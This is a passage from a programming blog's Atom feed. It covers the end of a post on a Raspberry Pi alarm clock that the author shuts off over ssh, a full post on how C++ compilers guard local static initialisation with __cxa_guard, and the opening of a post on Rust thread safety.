there will be a few pieces of soothing music (either violin music or parts of the <em>Interstellar</em>
OST) run once or twice, a while before the time of waking up. Close to the time of waking up, there
are a bunch of jobs where each one will run a string of annoying music. In my case, it&rsquo;s the
Minions&#8217; banana song followed by Nyan Cat (I sometimes add more to this list).</p>

<p>So far so good.</p>

<p>Now, the soothing music gives asleep-me me a chance to surrender and wake up <em>before</em> the Nyan Cat
begins, and often fear of Nyan Cat is a pretty good motivator to wake up. If I don&rsquo;t wake up to
the soft songs, the annoying ones invariably work.</p>

<p>At this stage I&rsquo;m still pretty groggy and have the intense urge to go back to bed. However, turning
off the alarm isn&rsquo;t simple. Since it&rsquo;s in a hard to reach area of the room, I can&rsquo;t just turn it
off. I need to get up, sit in my chair, and turn on the laptop (which is hibernated/suspended), and
kill it via ssh.</p>

<p>This needs me to:</p>

<ul>
<li><code>nmap</code> the network to find the Pi (I&rsquo;m the only one on this subnet who uses <code>ssh</code>, so this just needs a port filter)</li>
<li><code>ssh</code> into the Pi, remembering the password (I haven&rsquo;t done this yet but I could further complicate things by changing the password often to reduce muscle-memory)</li>
<li><code>killall mpg123</code> to kill the currently playing song</li>
<li>Cancel the remaining <code>at</code> jobs. This can be done with <code>atq</code> + <code>atrm</code> for every job (tedious and long), or with <code>awk</code>. If I&rsquo;ve already fully woken up, I&rsquo;m able to do the <code>awk</code> one, otherwise half-asleep me ends up doing the brute-force one, which is enough manual typing to shake the remaining bits of sleepiness off.</li>
</ul>


<p>After this whole process, it&rsquo;s pretty much guaranteed that I&rsquo;m fully awake &ndash; there&rsquo;s no going back now!</p>

<p>So far it&rsquo;s worked pretty well (both when I&rsquo;ve slept on time and when I haven&rsquo;t). The first ten minutes after this I&rsquo;m rather annoyed, but after that I&rsquo;m happy I woke up. If half-asleep me
eventually gets the muscle memory to get past this process, I should probably be able to tweak it
to add more complexity or change the way it works.</p>

<p>Of course, having an arms race with oneself probably isn&rsquo;t the best way to solve this problem. I
suspect I&rsquo;ll go back to regular alarms in a month or so, but it&rsquo;s a fun experiment for now.</p>

<p>However, by the time I&rsquo;m done with this alarm clock, I&rsquo;ll either be waking up on time, or I&rsquo;ll be
able to Linux in my sleep, which is a win-win!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>As a fourth year student the fully-awake me also has a bit of trouble with this ;)<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Adventures in Systems Programming: C++ Local Statics]]></title>
    <link href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/"/>
    <updated>2015-06-26T16:32:06-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics</id>
    <content type="html"><![CDATA[<p>For a while now I&rsquo;ve been quite interested in compilers and systems programming in general; and I
feel that an important feature of systems programming is that it&rsquo;s relatively easy to figure out
what a line of code does (modulo optimizations) at the OS or hardware level<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Conversely, it&rsquo;s
important to know how your tools work more than ever in systems programming. So when I see a
language feature I&rsquo;m not familiar with, I&rsquo;m interested in finding out how it works under the hood.</p>

<p>I&rsquo;m not a C++ expert. I can work on C++ codebases, but I&rsquo;m not anywhere near knowing all of the
features and nuances of C++. However, I am pretty good at Rust and understand a decent portion of
the compiler internals. This gives me a great perspective &mdash; I&rsquo;ve not yet internalized most C++
features to take them for granted, and I&rsquo;m well equipped to investigate these features.</p>

<p>Today I came across some C++ code similar to the following<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SomeType</span> <span class="n">bar</span> <span class="o">=</span> <span class="n">Env</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">someMethod</span><span class="p">();</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">OtherType</span> <span class="n">baz</span> <span class="o">=</span> <span class="n">Env</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">otherMethod</span><span class="p">(</span><span class="n">bar</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This code piqued my interest. Specifically, the local <code>static</code> stuff. I knew that when you have a
static like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">FOO</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>the <code>1</code> is stored somewhere in the <code>.data</code> section of the program. This is easily verified with <code>gdb</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">THING</span> <span class="o">=</span> <span class="mh">0xAAAA</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ g++ test.cpp -g
</span><span class='line'>$ gdb a.out
</span><span class='line'>(gdb) info addr THING
</span><span class='line'>Symbol &quot;THING&quot; is static storage at address 0x601038.
</span><span class='line'>(gdb) info symbol 0x601038
</span><span class='line'>THING in section .data
</span></code></pre></td></tr></table></div></figure>


<p>This is basically a part of the compiled program as it is loaded into memory.</p>

<p>Similarly, when you have a <code>static</code> that is initialized with a function, it&rsquo;s stored in the <code>.bss</code>
section, and initialized before <code>main()</code>. Again, easily verified:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="cp">#include&lt;iostream&gt;</span>
</span><span class='line'><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">bar</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;bar called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">return</span> <span class="mh">0xFAFAFA</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">THING</span> <span class="o">=</span> <span class="n">bar</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;main called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ ./a.out
</span><span class='line'>bar called
</span><span class='line'>main called
</span><span class='line'>$ gdb a.out
</span><span class='line'>(gdb) info addr THING
</span><span class='line'>Symbol &quot;THING&quot; is static storage at address 0x601198.
</span><span class='line'>(gdb) info symbol 0x601198
</span><span class='line'>THING in section .bss
</span></code></pre></td></tr></table></div></figure>


<p>We can also leave statics uninitialized (<code>static int THING;</code>) and they will be placed in <code>.bss</code><sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>.</p>

<p>So far so good.</p>

<p>Now back to the original snippet:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SomeType</span> <span class="n">bar</span> <span class="o">=</span> <span class="n">Env</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">someMethod</span><span class="p">();</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">OtherType</span> <span class="n">baz</span> <span class="o">=</span> <span class="n">Env</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">otherMethod</span><span class="p">(</span><span class="n">bar</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Naรฏvely one might say that these are statics which are scoped locally to avoid name clashes. It&rsquo;s
not much different from <code>static THING = bar()</code> aside from the fact that it isn&rsquo;t a global
identifier.</p>

<p>However, this isn&rsquo;t the case. What tipped me off was that this called <code>Env()</code>, and I wasn&rsquo;t so sure
that the environment was guaranteed to be properly initialized and available before <code>main()</code> is
called <sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>

<p>Instead, these are statics which are initialized the first time the function is called.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="cp">#include&lt;iostream&gt;</span>
</span><span class='line'><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">bar</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;bar called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">return</span> <span class="mh">0xFAFAFA</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;foo called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">static</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">bar</span><span class="p">();</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;Static is:&quot;</span><span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">&lt;&lt;</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;main called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="n">foo</span><span class="p">();</span>
</span><span class='line'> <span class="n">foo</span><span class="p">();</span>
</span><span class='line'> <span class="n">foo</span><span class="p">();</span>
</span><span class='line'> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ g++ test.cpp
</span><span class='line'>$ ./a.out
</span><span class='line'>main called
</span><span class='line'>foo called
</span><span class='line'>bar called
</span><span class='line'>Static is:16448250
</span><span class='line'>foo called
</span><span class='line'>Static is:16448250
</span><span class='line'>foo called
</span><span class='line'>Static is:16448250
</span></code></pre></td></tr></table></div></figure>


<p>Wait, &ldquo;the first time the function is called&rdquo;? <em>Alarm bells go off&hellip;</em> Surely there&rsquo;s some cost to that! Let&rsquo;s investigate.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ gdb a.out
</span><span class='line'>(gdb) disas bar
</span><span class='line'>   // snip
</span><span class='line'>   0x0000000000400c72 &lt;+15&gt;:    test   %al,%al
</span><span class='line'>   0x0000000000400c74 &lt;+17&gt;:    jne    0x400ca4 &lt;_Z3foov+65&gt;
</span><span class='line'>   0x0000000000400c76 &lt;+19&gt;:    mov    $0x6021f8,%edi
</span><span class='line'>   0x0000000000400c7b &lt;+24&gt;:    callq  0x400a00 &lt;__cxa_guard_acquire@plt&gt;
</span><span class='line'>   0x0000000000400c80 &lt;+29&gt;:    test   %eax,%eax
</span><span class='line'>   0x0000000000400c82 &lt;+31&gt;:    setne  %al
</span><span class='line'>   0x0000000000400c85 &lt;+34&gt;:    test   %al,%al
</span><span class='line'>   0x0000000000400c87 &lt;+36&gt;:    je     0x400ca4 &lt;_Z3foov+65&gt;
</span><span class='line'>   0x0000000000400c89 &lt;+38&gt;:    mov    $0x0,%r12d
</span><span class='line'>   0x0000000000400c8f &lt;+44&gt;:    callq  0x400c06 &lt;_Z3barv&gt;
</span><span class='line'>   0x0000000000400c94 &lt;+49&gt;:    mov    %eax,0x201566(%rip)        # 0x602200 &lt;_ZZ3foovE1i&gt;
</span><span class='line'>   0x0000000000400c9a &lt;+55&gt;:    mov    $0x6021f8,%edi
</span><span class='line'>   0x0000000000400c9f &lt;+60&gt;:    callq  0x400a80 &lt;__cxa_guard_release@plt&gt;
</span><span class='line'>   0x0000000000400ca4 &lt;+65&gt;:    mov    0x201556(%rip),%eax        # 0x602200 &lt;_ZZ3foovE1i&gt;
</span><span class='line'>   0x0000000000400caa &lt;+71&gt;:    mov    %eax,%esi
</span><span class='line'>   0x0000000000400cac &lt;+73&gt;:    mov    $0x6020c0,%edi
</span><span class='line'>   // snip
</span></code></pre></td></tr></table></div></figure>


<p>The instruction at <code>+44</code> calls <code>bar()</code>, and it seems to be surrounded by calls to some <code>__cxa_guard</code>
functions.</p>

<p>We can take a naรฏve guess at what this does: It probably just sets a hidden static flag on
initialization which ensures that it only runs once.</p>

<p>Of course, the actual solution isn&rsquo;t as simple. It needs to avoid data races, handle errors, and
somehow take care of recursive initialization.</p>

<p>Let&rsquo;s look at the <a href="http://mentorembedded.github.io/cxx-abi/abi.html#once-ctor">spec</a> and one <a href="http://www.opensource.apple.com/source/libcppabi/libcppabi-14/src/cxa_guard.cxx">implementation</a>, found by searching for
<code>__cxa_guard</code>.</p>

<p>Both of them show us the generated code for initializing things like local statics:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">obj_guard</span><span class="p">.</span><span class="n">first_byte</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">__cxa_guard_acquire</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">obj_guard</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">try</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">// ... initialize the object ...;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">catch</span> <span class="p">(...)</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">__cxa_guard_abort</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">obj_guard</span><span class="p">);</span>
</span><span class='line'>        <span class="k">throw</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="c1">// ... queue object destructor with __cxa_atexit() ...;</span>
</span><span class='line'>      <span class="n">__cxa_guard_release</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">obj_guard</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, <code>obj_guard</code> is our &ldquo;hidden static flag&rdquo;, with some other extra data.</p>

<p><code>__cxa_guard_acquire</code> and <code>__cxa_guard_release</code> acquire and release a lock to prevent recursive
initialization. So this program will crash:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="cp">#include&lt;iostream&gt;</span>
</span><span class='line'><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">bool</span> <span class="n">recur</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">bar</span><span class="p">(</span><span class="kt">bool</span> <span class="n">recur</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;bar called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">recur</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">foo</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'> <span class="k">return</span> <span class="mh">0xFAFAFA</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">bool</span> <span class="n">recur</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;foo called</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="k">static</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">bar</span><span class="p">(</span><span class="n">recur</span><span class="p">);</span>
</span><span class='line'> <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">&quot;Static is:&quot;</span><span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">&lt;&lt;</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'> <span class="n">foo</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
</span><span class='line'> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ g++ test.cpp
</span><span class='line'>$ ./a.out
</span><span class='line'>foo called
</span><span class='line'>bar called
</span><span class='line'>foo called
</span><span class='line'>terminate called after throwing an instance of &#39;__gnu_cxx::recursive_init_error&#39;
</span><span class='line'>  what():  std::exception
</span><span class='line'>Aborted (core dumped)
</span></code></pre></td></tr></table></div></figure>


<p>Over here, to initialize <code>i</code>, <code>bar()</code> needs to be called, but <code>bar()</code> calls <code>foo()</code> which needs <code>i</code>
to be initialized, which again will call <code>bar()</code> (though this time it won&rsquo;t recurse). If <code>i</code> wasn&rsquo;t
<code>static</code> it would be fine, but now we have two calls trying to initialize <code>i</code>, and it&rsquo;s unclear as
to which value should be used.</p>

<p>The implementation is pretty interesting. Before looking at the code my quick guess was that the
following would happen for local statics:</p>

<ul>
<li><code>obj_guard</code> is a struct containing a mutex and a flag with three states:
&ldquo;uninitialized&rdquo;, &ldquo;initializing&rdquo;, and &ldquo;initialized&rdquo;. Alternatively, use an atomic state indicator.</li>
<li>When we try to initialize for the first time, the mutex is locked, the flag is set
to &ldquo;initializing&rdquo;, the mutex is released, the value is initialized, and the flag is set to &ldquo;initialized&rdquo;.</li>
<li>If when acquiring the mutex, the value is &ldquo;initialized&rdquo;, don&rsquo;t initialize again</li>
<li>If when acquiring the mutex, the value is &ldquo;initializing&rdquo;, throw some exception</li>
</ul>


<p> (We need the tristate flag because without it recursion would cause deadlocks)</p>

<p>I suppose that this implementation would work, though it&rsquo;s not the one being used. The
<a href="https://github.com/android/platform_bionic/blob/master/libc/bionic/__cxa_guard.cpp">implementation in bionic</a> (the Android version of the C stdlib) is similar; it
uses per-static atomics which indicate various states. However, it does not throw an exception when
we have a recursive initialization, it instead seems to deadlock<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>. This is okay because the C++
spec says (<a href="http://www.open-std.org/jtc1/sc22/open/n2356/stmt.html#stmt.dcl">Section 6.7.4</a>)</p>

<blockquote><p>If control re-enters the declaration (recursively) while the object is being initialized, the
behavior is undefined.</p></blockquote>

<p>However, the implementations in <a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/libsupc%2B%2B/guard.cc">gcc/libstdc++</a> (also <a href="http://www.opensource.apple.com/source/libcppabi/libcppabi-14/src/cxa_guard.cxx">this version</a> of
<code>libcppabi</code> from Apple, which is a bit more readable) do something different. They use a global
recursive mutex to handle reentrancy. Recursive mutexes basically can be locked multiple times by a
single thread, but cannot be locked by another thread till the locking thread unlocks them the same
number of times. This means that recursion/reentrancy won&rsquo;t cause deadlocks, but we still have one-
thread-at-a-time access. What these implementations do is:</p>

<ul>
<li><code>guard_object</code> is a set of two flags, one which indicates if the static is initialized,
and one which indicates that the static is being initialized (&ldquo;in use&rdquo;)</li>
<li>If the object is initialized, do nothing (this doesn&rsquo;t use mutexes and is cheap).
This isn&rsquo;t exactly part of the implementation in the library, but is part of the generated code.</li>
<li>If it isn&rsquo;t initialized, acquire the global recursive lock</li>
<li>If the object is initialized by the time the lock was acquired, unlock and return</li>
<li>If not, check if the static is being initialized from the second <code>guard_object</code> flag. If it is
&ldquo;in use&rdquo;, throw an exception.</li>
<li>If it wasn&rsquo;t, mark the second flag of the static&rsquo;s guard object as being &ldquo;in use&rdquo;</li>
<li>Call the initialization function, bubble errors</li>
<li>Unlock the global mutex</li>
<li>Mark the second flag as &ldquo;not in use&rdquo;</li>
</ul>


<p>At any one time, only one thread will be in the process of running initialization routines, due to
the global recursive mutex. Since the mutex is recursive, a function (eg <code>bar()</code>) used for
initializing local statics may itself use (different) local statics. Due to the &ldquo;in use&rdquo; flag, the
initialization of a local static may not recursively call its parent function without causing an
error.</p>

<p>This doesn&rsquo;t need per-static atomics, and doesn&rsquo;t deadlock, however it has the cost of a global
mutex which is called at most once per local static. In a highly threaded situation with lots of
such statics, one might want to reevaluate directly using local statics.</p>

<p><a href="https://github.com/llvm-mirror/libcxxabi/blob/master/src/cxa_guard.cpp#L188">LLVM&rsquo;s libcxxabi</a> is similar to the <code>libstdc++</code> implementation, but instead of a recursive
mutex it uses a regular mutex (on non-ARM Apple systems) which is unlocked before
<code>__cxa_guard_acquire</code> exits and tests for reentrancy by noting the thread ID in the guard object
instead of the &ldquo;in use&rdquo; flag. Condvars are used for waiting for a thread to stop using an object. On
other platforms, it seems to deadlock, though I&rsquo;m not sure.</p>

<p>So here we have a rather innocent-looking feature that has some hidden costs and pitfalls. But now I
can look at a line of code where this feature is being used, and have a good idea of what&rsquo;s
happening there. One step closer to being a better systems programmer!</p>

<p><em>Thanks to Rohan Prinja, Eduard Burtescu, and Nishant Sunny for reviewing drafts of this blog post</em></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Emphasis on <em>relatively</em>. This article will show that it&rsquo;s definitely not &ldquo;easy&rdquo; all the time.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>This was JNI code which obtained a JNI environment and pulled out method/class IDs from it to be used later<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Unless it has a constructor or otherwise isn&rsquo;t made out of trivially constructible types; in this case it is treated similar to the previous case.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>I checked later, and it was indeed the case that global statics are initialized before <code>Env()</code> is ready<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>I later verified this with a modification of the crashing program above stuck inside some JNI Android code.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Rust Achieves Thread Safety]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/30/how-rust-achieves-thread-safety/"/>
    <updated>2015-05-30T05:25:32-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/30/how-rust-achieves-thread-safety</id>
    <content type="html"><![CDATA[<p><em>In every talk I have given till now, the question &ldquo;how does Rust achieve thread safety?&rdquo;
has invariably come up<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. I usually just give an overview, but this provides a more comprehensive
explanation for those who are interested</em></p>

<p>See also: <a href="http://huonw.github.io/blog/2015/02/some-notes-on-send-and-sync/">Huon&rsquo;s blog post on the same topic</a></p>

<p>In my <a href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/">previous post</a> I touched a bit on the <a href="http://doc.rust-lang.org/std/marker/trait.Copy.html"><code>Copy</code></a> trait. There are other such
&ldquo;marker&rdquo; traits in the standard library, and the ones relevant to this discussion are <a href="http://doc.rust-lang.org/std/marker/trait.Send.html"><code>Send</code></a>
